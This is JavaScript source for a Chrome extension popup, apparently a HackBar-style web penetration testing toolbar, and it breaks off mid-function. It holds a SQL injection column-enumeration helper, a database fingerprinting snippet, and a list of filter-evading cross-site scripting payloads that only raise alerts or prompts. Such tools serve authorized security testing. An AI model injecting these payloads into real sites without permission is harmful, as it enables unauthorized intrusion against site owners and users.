/*
Modified By nullBr@!N
On 03 March 2020
*/

$(document).ready(function(){
	chrome.tabs.getSelected(null,function(tab){

		var tabid = tab.id;
//		alert(tabid);
		var name = "mydata_"+tabid+"=";
//		alert(name);
//		var all = document.cookie;
//		$('#text_field').prop('value',all);
	    var ca = document.cookie.split(';');
        final1 = '';
	    for(var i=0; i<ca.length; i++) {
	        var c = ca[i].trim();
	        if (c.indexOf(name) == 0)
	        	var final1 = c.substring(name.length,c.length);
//	        else
//	        	var final1 = '';
	    }
	    var final2 = unescape(final1);
//	    alert(final1);
		$('#text_field').prop('value',final2);
	});

});


$(document).ready(function(){

	$('.btn').click(function(){
		setTimeout(function(){
			chrome.tabs.getSelected(null,function(tab){
				var tabid = tab.id;
			
				var text = $('#text_field').val();
	//			alert(text);
				document.cookie="mydata_"+tabid+"="+escape(text);
			});
		},500);

	});

	$('#loadurl').click(function(){
		setTimeout(function(){
			chrome.tabs.getSelected(null,function(tab){
				var tabid = tab.id;
			
				var text = $('#text_field').val();
	//			alert(text);
				document.cookie="mydata_"+tabid+"="+escape(text);
			
			});
		},500);	
	});

	$('#spliturl').click(function(){
		setTimeout(function(){
			chrome.tabs.getSelected(null,function(tab){
				var tabid = tab.id;
				var text = $('#text_field').val();
	//			alert(text);
				document.cookie="mydata_"+tabid+"="+escape(text);
			});
		},500);

	});

	$('#execute').click(function(){
		setTimeout(function(){
			chrome.tabs.getSelected(null,function(tab){

				var tabid = tab.id;				
				var text = $('#text_field').val();
	//			alert(text);
				document.cookie="mydata_"+tabid+"="+escape(text);
			});
		},500);

	});


	$('#text_field').on('keyup change paste' , function(){
//		alert(4);
		chrome.tabs.getSelected(null,function(tab){
			var tabid = tab.id;
			var text = $('#text_field').val();
	//		alert(text);
			document.cookie="mydata_"+tabid+"="+escape(text);
		});
	});

	$('#loadurl').on('mouseover', function(){
		$("#loadurl").attr('title', 'Load URL');
//		alert(4);
	});

	$('#spliturl').on('mouseover', function(){
		$("#spliturl").attr('title', 'Split URL');
//		alert(4);
	});

	$('#execute').on('mouseover', function(){
		$("#execute").attr('title', 'Execute');
//		alert(4);
	});

});

$(document).ready(function(){

	function get_cursor_pos1(oField) {

	  // Initialize
	  var iCaretPos = 0;

	  // IE Support
	  if (document.selection) {

	    // Set focus on the element
	    oField.focus ();

	    // To get cursor position, get empty selection range
	    var oSel = document.selection.createRange ();

	    // Move selection start to 0 position
	    oSel.moveStart ('character', -oField.value.length);

	    // The caret position is selection length
	    iCaretPos = oSel.text.length;
	  }

	  // Firefox support
	  else if (oField.selectionStart || oField.selectionStart == '0')
	    iCaretPos = oField.selectionStart;

	  // Return results
	  return (iCaretPos);
	}

	function setInputSelection(input, startPos, endPos) {
	    input.focus();
	    if (typeof input.selectionStart != "undefined") {
	        input.selectionStart = startPos;
	        input.selectionEnd = endPos;
	    } else if (document.selection && document.selection.createRange) {
	        // IE branch
	        input.select();
	        var range = document.selection.createRange();
	        range.collapse(true);
	        range.moveEnd("character", endPos);
	        range.moveStart("character", startPos);
	        range.select();
	    }
	}

	$('#incorder').click(function(){



			var start = document.getElementById('text_field').selectionStart;
			var end = document.getElementById('text_field').selectionEnd;

			var inputstr = $('#text_field').val();

//			var remaining_start = inputstr.substring(0,start);
//			var remaining_end = inputstr.substring(end);

			var str = inputstr.substring(start,end);

			if(str == '')
			{
				str = inputstr;
			}

			var get_orderby_pos = str.indexOf("order by");
//			alert(get_orderby_pos);

			if(get_orderby_pos == -1)
			{
				alert('There is no order by available in your selected text');
				die();
			}

			var get_orderby_pos = parseInt(get_orderby_pos);

			var s = get_orderby_pos + 9;

			var remaining_start = inputstr.substring(0,s);

//			alert(s);

			var sub = str.substring(s);
			
			var parse_sub = parseInt(sub);

			var parse_sub_length = parse_sub.toString().length;

//			alert(parse_sub);

//			alert();
			
			var total_end = s+parse_sub_length;

			var remaining_end = inputstr.substring(total_end);

			parse_sub = parse_sub+1;

//			alert(parse_sub);
//			alert(remaining_start);
//			alert(parse_sub);
//			alert(remaining_end);
	
			var update = remaining_start + parse_sub + remaining_end;

			var goto = update;
			chrome.tabs.update({url:goto});
	
			$('#text_field').prop('value',update);

	});

	$('#decorder').click(function(){
		chrome.tabs.executeScript(null,{},function(){

			var start = document.getElementById('text_field').selectionStart;
			var end = document.getElementById('text_field').selectionEnd;

			var inputstr = $('#text_field').val();

//			var remain_start = inputstr.substring(0,start);
//			var remain_end = inputstr.substring(end);

			var str = inputstr.substring(start,end);

			if(str == '')
			{
				str = inputstr;
			}

			var get_orderby_pos = str.indexOf("order by");
//			alert(get_orderby_pos);

//			die();
			
			if(get_orderby_pos == -1)
			{
				alert('There is no order by available in your selected text');
				die();
			}


			var get_orderby_pos = parseInt(get_orderby_pos);

			var s = get_orderby_pos + 9;

			var remaining_start = inputstr.substring(0,s);

//			alert(s);

			var sub = str.substring(s);
			
			var parse_sub = parseInt(sub);

			var parse_sub_length = parse_sub.toString().length;

//			alert(parse_sub);

//			alert();
			
			var total_end = s+parse_sub_length;

			var remaining_end = inputstr.substring(total_end);

			parse_sub = parse_sub-1;

//			alert(parse_sub);
//			alert(remaining_start);
//			alert(parse_sub);
//			alert(remaining_end);
			var update = remaining_start + parse_sub + remaining_end;

//			var goto = $('#text_field').val();
			var goto = update;
			chrome.tabs.update({url:goto});

			$('#text_field').prop('value',update);

		});
	});


	$('#inc4number').click(function(){
		chrome.tabs.executeScript(null,
		{

		},
		function(){
			var start = document.getElementById('text_field').selectionStart;
			var end = document.getElementById('text_field').selectionEnd;

			var inputstr = $('#text_field').val();

			var remaining_start = inputstr.substring(0,start);
			var remaining_end = inputstr.substring(end);

			var str = inputstr.substring(start,end);

			if(str == '')
			{
				var str = window.prompt('No text was selected for requested action','String to use');
//				var start = 0;
//alert(start);
				var end = start+str.length;
			}

			var e = document.getElementById("dropdown");
			var strUser = e.options[e.selectedIndex].value;  // Returns selected option from dropdown

//			alert(strUser);
			
			if(strUser == 'int' )
			{
				var regEx=/[0-9]/;
				var check = regEx.test(str);
				var n= str.length;
				var prev_length = str.length;
				var prev_string = str;
//				alert(str);

				if(check)
				{
					str=parseInt(str);
//					alert(str);
					var n= str.toString().length;
					str=str+1;
					newval = str
					var m= str.toString().length;
//					alert(start+':'+end);
					if(m-prev_length==1)
					{
						end=end+1;
//						alert(start);
//						flag++;
	
	//						incsize++;
//						newint = newval; 
//						remain_start = remaining_start;
//						remain_end = remaining_end;
					}
//					alert(m+':'+n);
					else if(prev_length-m == 1)
					{
//						alert('Step1');
						if(prev_string.substring(0,1)=='0')
						{
//							alert('Step2');
							newval = '0'+newval;
						}

					}
				}
				else
				{
					alert('invalid selection');
				}

			}
			else if(strUser == 'oct')
			{
				var regEx=/[0-7]/;
				var check = regEx.test(str);
				if(check)
				{
					var n= str.length;
					var intvalue = parseInt(str, 8);
					intvalue++;
					var incoct = intvalue.toString(8);
					newval = incoct;
					var m= newval.length;
					
					if(m-n==1)
					{
						end++;
					}
				}
				else
				{
					alert('invalid selection');
				}
				
			}
		 else if(strUser == 'hex')
			{
				var regEx=/[0-9a-fA-F]/;
				var check = regEx.test(str);
				if(check){
							var n= str.length;
							var intvalue = parseInt(str, 16);
							intvalue++;
							var inchex = intvalue.toString(16);
							newval = inchex;
							var m= newval.length;
							
						if(m-n==1)
							{
								end++;
							}
						 }
				else{
					alert('invalid selection');
					}
				
			}
		 else if(strUser == 'alpha')
			{
				var regEx=/^[a-z]$/;
				var check = regEx.test(str);
				if(check){
			
							var value=str.charCodeAt(0);
							value= value+1;
							if(value>122)
							{
							value=97;
							}
							str=String.fromCharCode(value);															
							newval=str;
						}
				else{	
						alert('check input');						
					}
		}
	   	 else if(strUser == 'alnum')
			{
				var regEx=/^[0-9a-z]$/;
				var check = regEx.test(str);
				if(check){
			
							var value=str.charCodeAt(0);
							value= value+1;
							if(value>122)
							{
							value=48;
							}

							if(value==58)
							{
								value=97;
							}
							str=String.fromCharCode(value);															
							newval=str;
						}
				else{	
						alert('check input');						
					}
			}

//			alert(3);

			var update = remaining_start+newval+remaining_end;
			$('#text_field').prop('value',update);
//			alert(start);
//			alert(end);
			setInputSelection(document.getElementById("text_field"), start, end);
//			alert(5);

		});

	});

	$('#dec4number').click(function(){
		chrome.tabs.executeScript(null,
		{

		},
		function(){
			var start = document.getElementById('text_field').selectionStart;
			var end = document.getElementById('text_field').selectionEnd;

			var inputstr = $('#text_field').val();

			var remaining_start = inputstr.substring(0,start);
			var remaining_end = inputstr.substring(end);

			var str = inputstr.substring(start,end);

			if(str == '')
			{
				var str = window.prompt('No text was selected for requested action','String to use');
//				var start = 0;
				var end = start+str.length;
			}

			var e = document.getElementById("dropdown");
			var strUser = e.options[e.selectedIndex].value;  // Returns selected option from dropdown

//			alert(strUser);
			
			if(strUser == 'int' )
			{
				var regEx=/[0-9]/;
				var check = regEx.test(str);
				var n= str.length;
				var prev_length = str.length;
				var prev_string = str;

//				alert(check);
				if(check)
				{
					str=parseInt(str);
					var n= str.toString().length;
					if(str==0){
						str=0;
					}
					else
					{
						str=str-1;
					}
					
					newval = str;
					var m= str.toString().length;
//					alert(start+':'+end);
//					alert(prev_length+':'+m);
					if(m-prev_length==1)
					{
						end=end-1;
//						alert(start);
//						flag++;
//						incsize++;
//						newint = newval; 
//						remain_start = remaining_start;
//						remain_end = remaining_end;
					}
					else if(prev_length-m == 1)
					{
//						alert('Step1');
//						alert(prev_string);
						if(prev_string.substring(0,1)=='0')
						{
//							alert('Step2');
							newval = '0'+newval;
						}
						if(prev_string.substring(0,1)=='1')
						{
//							alert('Step2');
							newval = '0'+newval;
						}

					}

				}
				else
				{
					alert('invalid selection');
				}

			}
			else if(strUser == 'oct')
			{
				var regEx=/[0-7]/;
				var check = regEx.test(str);
				if(check)
				{
					var n= str.length;
					var intvalue = parseInt(str, 8);
					if(intvalue==0){
						intvalue=0;
					}
					else
					{
						intvalue--;
					}

					var incoct = intvalue.toString(8);
					newval = incoct;
					var m= newval.length;
					
					if(n-m==1)
					{
						end--;
					}
				}
				else
				{
					alert('invalid selection');
				}
				
			}
		 else if(strUser == 'hex')
			{
				var regEx=/[0-9a-fA-F]/;
				var check = regEx.test(str);
				if(check){
					var n= str.length;
					var intvalue = parseInt(str, 16);

					if(intvalue==0){
						intvalue=0;
					}
					else
					{
						intvalue--;
					}

					var inchex = intvalue.toString(16);
					newval = inchex;
					var m= newval.length;
							
						if(n-m==1)
							{
								end--;
							}
						 }
				else{
					alert('invalid selection');
					}
				
			}
		 else if(strUser == 'alpha')
			{
				var regEx=/^[a-z]$/;
				var check = regEx.test(str);
				if(check){
			
							var value=str.charCodeAt(0);
							value= value-1;
							if(value<97)
							{
							value=122;
							}
							str=String.fromCharCode(value);															
							newval=str;
						}
				else{	
						alert('check input');						
					}
		}
	   	 else if(strUser == 'alnum')
			{
				var regEx=/^[0-9a-z]$/;
				var check = regEx.test(str);
				if(check){
			
							var value=str.charCodeAt(0);
							value= value-1;
							if(value<48)
							{
								value=122;
							}

							if(value==96)
							{
								value=57;
							}
							str=String.fromCharCode(value);															
							newval=str;
						}
				else{	
						alert('check input');						
					}
			}

//			alert(3);

			var update = remaining_start+newval+remaining_end;
			$('#text_field').prop('value',update);
			setInputSelection(document.getElementById("text_field"), start, end);
//			alert(5);

		});		

	});

  $('#loadurl').click(function(){
    chrome.tabs.executeScript(null,
      {

      },
      	function(){
  //    			alert(1);

				chrome.tabs.getSelected(null,function(tab) {
				//				alert(tab.id);
				    var tablink = tab.url;
				    var hello = unescape(tablink);
//				    alert(tablink);
					$('#text_field').prop('value',hello);
					document.cookie="mydata="+hello;
//					setInputSelection(document.getElementById('text_field'));
					document.getElementById('text_field').select();
				});
      		if (chrome.runtime.lastError) { // or if (!result)
//		    	alert(chrome.runtime.lastError.message);
		        // Get the error message via chrome.runtime.lastError.message
//		        return;
//		        alert(1)
//				var data = 2;
 //				return data;

 //				$('#text_field').prop('value',data);
 			}
      	});
  });

  	$('#spliturl').click(function(){
	    chrome.tabs.executeScript(null,
	    	{

	    	},
	    	function(){
	    		var hello = $('#text_field').val();
			    var text = unescape(hello);
			    var hello1 = text;
//			    alert(text);
	    		start = 0;
	    		var check = 0;
	    		var string = '';
	    		for(i=0;i<hello1.length;i++)
	    		{
	    			var substr = text.substring(i,i+1);
//	    			alert(substr);
	    			if(substr == '?' || substr == '&')
	    			{
//	    				alert(i);
	    				var qwe = text.substring(start,i);
//	    				alert(i);
	
						start = i;
						string += qwe+'\n';
//	    				text = text.substring(i);

//	    				alert(text);
//	    				alert(qwe);
	    				var end = text.substring(i);
	    				check = 1;
	    			}

	    		}

	    		if(check == 0)
	    		{
	    			end = hello1;
	    		}

	    		string = string + end;
//	    		alert(string);
//	    		document.cookie="mydata="+escape(string);
	    		$('#text_field').prop('value',string);


	    });
	});

  $('#execute').click(function(){
    chrome.tabs.executeScript(null,
     {},
      	function(){
//				chrome.tabs.getSelected(null,function(tab) {
//				    var tablink1 = tab.url;
//				    alert(tablink1);
					var goto = $('#text_field').val();
//				    window.location.href=goto;
//					document.location.=goto;
//					window.location.assign("http://google.com")
					chrome.tabs.update({url:goto});
//				    alert(4);
//				});

      		if (chrome.runtime.lastError) { // or if (!result)
//		    	alert(chrome.runtime.lastError.message);
		        // Get the error message via chrome.runtime.lastError.message
 			}
      	});
});


	$('#incheight').click(function(){
		var row = parseInt($('#text_field').attr('rows'));
//		alert(row);
		var inc = 2;
		if(row < 50)
		{
			var setrow = row+inc;
		}
		else
		{
			var setrow = row;
		}
//		alert(setrow);
		$('#text_field').prop('rows',setrow);
	});

	$('#decheight').click(function(){
		var row = parseInt($('#text_field').attr('rows'));
		var dec = 2;
		if(row >7)
		{
			var setrow = row-dec;
		}
		else
		{
			var setrow = row;
		}
		$('#text_field').prop('rows',setrow);
	});

	$('#strtohex').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var hex='';

			    for(var i=0;i<str.length;i++) {
			        hex += ''+str.charCodeAt(i).toString(16);
			    }
 				
			    var update = remaining_start+hex+remaining_end;

 				var end_selection_after = start+hex.length;

				setInputSelection(document.getElementById("text_field"), start, end_selection_after);
				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#basicinfo').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);
/*
				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
				}
*/
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var final1 = 'CONCAT_WS(CHAR(32,58,32),user(),database(),version())'; 			    
			    var update = remaining_start+final1+remaining_end;
 //				document.cookie="mydata"+update;

 				var final_length = final1.length-1;
				var end_selection_after = start+final_length;
//				start = 2;
//				alert(start+':'+end_selection_after);
				setInputSelection(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
//				setInputSelection(document.getElementById('text_field'),5,7);
		});
	});


	$('#hextostr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					alert('No text was selected for requested action');
//					var str = window.prompt('No text was selected for requested action','String to use');
					$('#text_field').prop('value',inputstr);
					die();
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var hex = '';
				str = escape(str);
			    for (var i = 0; i < str.length; i+=2) {
			       var sub = escape(str.substr(i, 2));
     			   var v = parseInt(sub, 16);
//     			   alert(v);
 			       if (v) hex += String.fromCharCode(v);
 			    }
				
//				var final1 = str;
			    var update = remaining_start+hex+remaining_end;

				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";

 				var end_selection_after = start+hex.length;

				setInputSelection(document.getElementById("text_field"), start, end_selection_after);
		});
	});


	$('#strtoascii').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var ascii='';

			    for(var i=0;i<str.length;i++) { 
			    	if(i == str.length-1)
			    	{
				        ascii += ""+str.charCodeAt(i)+"";
			    	}
			    	else
			    	{
				        ascii += ""+str.charCodeAt(i)+", ";
			    	}
			    }
   
   				var final1 = 'String.fromCharCode('+ascii+')';
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";

 				var end_selection_after = start+final1.length;
				setInputSelection(document.getElementById("text_field"), start, end_selection_after);
		});
	});

	$('#stringtoascii').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var ascii='';

			    for(var i=0;i<str.length;i++) { 
			    	if(i == str.length-1)
			    	{
				        ascii += ""+str.charCodeAt(i)+"";
			    	}
			    	else
			    	{
				        ascii += ""+str.charCodeAt(i)+", ";
			    	}
			    }
   
   				var final1 = ascii;
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
				setInputSelection(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";

		});
	});

});

$(document).ready(function(){

		function get_cursor_pos(oField) {

	  // Initialize
	  var iCaretPos = 0;

	  // IE Support
	  if (document.selection) {

	    // Set focus on the element
	    oField.focus ();

	    // To get cursor position, get empty selection range
	    var oSel = document.selection.createRange ();

	    // Move selection start to 0 position
	    oSel.moveStart ('character', -oField.value.length);

	    // The caret position is selection length
	    iCaretPos = oSel.text.length;
	  }

	  // Firefox support
	  else if (oField.selectionStart || oField.selectionStart == '0')
	    iCaretPos = oField.selectionStart;

	  // Return results
	  return (iCaretPos);
	}

	function setInputSelection1(input, startPos, endPos) {
	    input.focus();
	    if (typeof input.selectionStart != "undefined") {
	        input.selectionStart = startPos;
	        input.selectionEnd = endPos;
	    } else if (document.selection && document.selection.createRange) {
	        // IE branch
	        input.select();
	        var range = document.selection.createRange();
	        range.collapse(true);
	        range.moveEnd("character", endPos);
	        range.moveStart("character", startPos);
	        range.select();
	    }
	}



	$('#asciitostr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					alert('No text was selected for requested action');
//					var str = window.prompt('No text was selected for requested action','String to use');
					$('#text_field').prop('value',inputstr);
					die();
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var hex = '';
				var start =0;

				str = unescape(str);
//				alert(str);
			    for (var i = 0; i < str.length; i++) {
			       var sub = str.substring(i,i+1);
//			       alert(sub);
			       if(sub == ',')
			       {
  			       	 var v = str.substring(start,i);
///  			       	 alert(v);
  			       	 start = i+1;
					 hex += String.fromCharCode(v);  			       	 
			       }
			       else if(i == str.length-1)
			       {
//			       	alert(6);
			      	 var v = str.substring(start,str.length);
//  			       	 alert(v);
  			       	 start = i+1;
					 hex += String.fromCharCode(v);  			       	 
			       	
			       }

 			    }



				
//				var final1 = hex;
			    var update = remaining_start+hex+remaining_end;


				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#alertxss').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
//				alert(5);
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);
/*
				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
				}
*/
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);
   				
   				var final1 = 'alert(String.fromCharCode(88, 83, 83))';

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

// 				var end_selection_after = start+final1.length;
 //				alert(start+':'+end_selection_after);
	//			setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
		});
	});

	$('#strtohtml').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,{},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

//				alert(remaining_start+remaining_end);
//				alert(str);

				var hex='';
				var ascii = '';

			    for(var i=0;i<str.length;i++) {
			    	hex += '&#x'+str.charCodeAt(i).toString(16)+';';
			        ascii += " "+str.charCodeAt(i);
			    }
 				
 				var update = remaining_start+hex+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";

 				var end_selection_after = start+hex.length;
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

		});
	});


	$('#xlfipon').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "INJECTXXXXXXXXXXXXXXXXX ''`(/test/);</test>=/* <!-- //#";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfiptw').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "'></img><img src=x onerror=confirm`1337`>/</textarea><ScRiPt>prompt(/1337/)</ScRiPt>'><iframe/onload=alert(document.domain)//";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipth').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "</SCript><svG/onLoad=prompt('OPENBUGBOUNTY')>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '"></textarea><svg onload=(alert)("XSSPOSED")>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/--!><Script /K/>confirm(documnet.domain)</Script /K/>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<w="/x="y>"/ondblclick=`<`[confir\u006d``]>Click';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipsvn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '"><brute+onbeforescriptexecute=setInterval`alert\x28document.domain\x29`>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipght').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<b+onafterscriptexecute=alert`1337`>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '<svg%0Aonload=%09((pro\u006dpt))()//';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

